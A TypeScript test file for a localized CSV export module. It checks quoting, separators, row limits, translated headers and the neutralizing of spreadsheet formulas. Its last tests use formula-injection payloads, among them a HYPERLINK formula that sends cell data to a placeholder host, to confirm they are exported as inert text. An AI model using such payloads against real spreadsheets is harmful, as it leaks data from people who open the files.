import { describe, expect, it } from "vitest";
import { CSV_LIMIT, csvEscape, neutralizeFormula, toCsv, type CsvOptions } from "../src/csv.js";
import { generateAll } from "../src/generator.js";
import { COLUMN_IDS, METRIC_COUNT, METRIC_IDS } from "../src/schema.js";
import { writeComment } from "../src/store.js";
import { labels as arLabels, pools as ar } from "../src/pools/ar.js";
import { labels as enLabels, pools as en } from "../src/pools/en.js";
import { labels as ruLabels, pools as ru } from "../src/pools/ru.js";

const store = generateAll(20260904, 1_000, 500);
const index = Uint32Array.from([0, 1, 2]);
const ruOptions: CsvOptions = { headers: ruLabels.columns, pools: ru, labels: ruLabels };

describe("csv export", () => {
  it("quotes only what needs quoting", () => {
    expect(csvEscape("ООО Вектор")).toBe("ООО Вектор");
    expect(csvEscape("а;б")).toBe('"а;б"');
    expect(csvEscape('с "кавычками"')).toBe('"с ""кавычками"""');
  });

  it("writes a header row and one line per row", () => {
    const csv = toCsv(store, index, ["id", "client", "status"], ruOptions);
    const lines = csv.split("\r\n");
    expect(lines).toHaveLength(4);
    expect(lines[0]).toBe("ID;Клиент;Статус");
    expect(lines[1]?.startsWith("Z-000001;")).toBe(true);
    expect(lines[1]?.endsWith(ruLabels.status[store.status[0] ?? 0] ?? "")).toBe(true);
  });

  it("skips unknown columns and honours the row limit", () => {
    expect(toCsv(store, index, ["id", "nope"], ruOptions).split("\r\n")[0]).toBe("ID");
    const all = Uint32Array.from({ length: 1_000 }, (_, i) => i);
    expect(toCsv(store, all, ["id"], { ...ruOptions, limit: 10 }).split("\r\n")).toHaveLength(11);
    expect(CSV_LIMIT).toBe(5_000);
  });

  it("caps at CSV_LIMIT rows by default", () => {
    const big = generateAll(1, 6_000);
    const all = Uint32Array.from({ length: 6_000 }, (_, i) => i);
    expect(toCsv(big, all, ["id"], ruOptions).split("\r\n")).toHaveLength(CSV_LIMIT + 1);
  });

  it("takes the header from the caller and falls back to the id", () => {
    const csv = toCsv(store, index, ["id", "amount", "comment"], {
      ...ruOptions,
      headers: { id: "Номер", amount: "Сумма; руб." },
    });
    expect(csv.split("\r\n")[0]).toBe('Номер;"Сумма; руб.";comment');
  });

  it("writes every column of the catalogue with the defaults", () => {
    const csv = toCsv(store, [5], COLUMN_IDS, { headers: enLabels.columns, pools: en, labels: enLabels });
    const [header, line] = csv.split("\r\n");
    expect(header?.split(";")).toHaveLength(30);
    const cells = line!.split(";");
    expect(cells[0]).toBe("Z-000006");
    expect(cells[2]).toMatch(/^\d{4}-\d{2}-\d{2}$/);
    expect(cells[3]).toBe(String(store.amount[5]));
    expect(["RUB", "USD", "EUR"]).toContain(cells[4]);
    expect(cells[11]).toBe(String(store.metrics[5 * METRIC_COUNT]));
  });

  it("uses the caller's formatters, separator and newline", () => {
    const csv = toCsv(store, [0], ["amount", "date"], {
      ...ruOptions,
      separator: ",",
      newline: "\n",
      formatNumber: (n) => n.toFixed(2),
      formatDate: () => "day",
    });
    expect(csv).toBe(`${ruLabels.columns.amount},${ruLabels.columns.date}\n${store.amount[0]!.toFixed(2)},day`);
    expect(csvEscape("a,b", ",")).toBe('"a,b"');
    expect(csvEscape("a;b", ",")).toBe("a;b");
  });

  it("writes the same numbers in every language and only the strings change", () => {
    const columns = ["id", "amount", "sla", "revenue", "client", "region", "status"];
    const rows = Uint32Array.from({ length: 200 }, (_, i) => i);
    const split = (csv: string) => csv.split("\r\n").slice(1).map((l) => l.split(";"));
    const a = split(toCsv(store, rows, columns, { headers: enLabels.columns, pools: en, labels: enLabels }));
    const b = split(toCsv(store, rows, columns, { headers: arLabels.columns, pools: ar, labels: arLabels }));
    a.forEach((cells, r) => {
      expect(cells.slice(0, 4)).toEqual(b[r]!.slice(0, 4));
      expect(cells[4]).toBe(en.clients[store.client[r]!]);
      expect(b[r]![4]).toBe(ar.clients[store.client[r]!]);
    });
  });

  it("writes edited and colleague comments in the chosen language", () => {
    const s = generateAll(2, 10, 10);
    writeComment(s, 0, { kind: "text", text: 'said "no"; call later' }, 0);
    writeComment(s, 1, { kind: "colleague", n: 4 }, 0);
    const csv = toCsv(s, [0, 1], ["comment"], ruOptions).split("\r\n");
    expect(csv[1]).toBe('"said ""no""; call later"');
    expect(csv[2]).toBe("Правка коллеги 4");
  });

  it("writes text that starts like a formula as text, so a spreadsheet does not run it", () => {
    expect(neutralizeFormula("=1+1")).toBe("'=1+1");
    for (const lead of ["=", "+", "-", "@", "\t", "\r", "\uff1d", "\uff0b", "\uff0d", "\uff20"]) {
      expect(neutralizeFormula(`${lead}x`)).toBe(`'${lead}x`);
    }
    expect(neutralizeFormula("a=b")).toBe("a=b");
    expect(neutralizeFormula("")).toBe("");

    const s = generateAll(3, 6, 6);
    const payloads = ['=HYPERLINK("http://example.test/?"&A1,"Open")', "+1", "-2", "@SUM(A1:A9)", "\tcmd", "\rcmd"];
    payloads.forEach((text, row) => writeComment(s, row, { kind: "text", text }, 0));
    const lines = toCsv(s, [0, 1, 2, 3, 4, 5], ["comment"], ruOptions).split("\r\n");
    expect(lines.slice(1)).toEqual([
      '"\'=HYPERLINK(""http://example.test/?""&A1,""Open"")"',
      "'+1",
      "'-2",
      "'@SUM(A1:A9)",
      "'\tcmd",
      '"\'\rcmd"',
    ]);
  });

  it("neutralises a formula in a header, but never a number", () => {
    const s = generateAll(3, 2, 2);
    s.amount[0] = -1500;
    s.metrics[0 * METRIC_COUNT + METRIC_IDS.indexOf("marginAbs")] = -42;
    const csv = toCsv(s, [0], ["amount", "marginAbs", "sla"], {
      ...ruOptions,
      headers: { amount: "=cmd", marginAbs: "Margin", sla: "SLA" },
    }).split("\r\n");
    expect(csv[0]).toBe("'=cmd;Margin;SLA");
    expect(csv[1]).toBe(`-1500;-42;${s.sla[0]}`);
    const formatted = toCsv(s, [0], ["amount"], { ...ruOptions, formatNumber: (n) => n.toFixed(2) }).split("\r\n");
    expect(formatted[1]).toBe("-1500.00");
  });
});
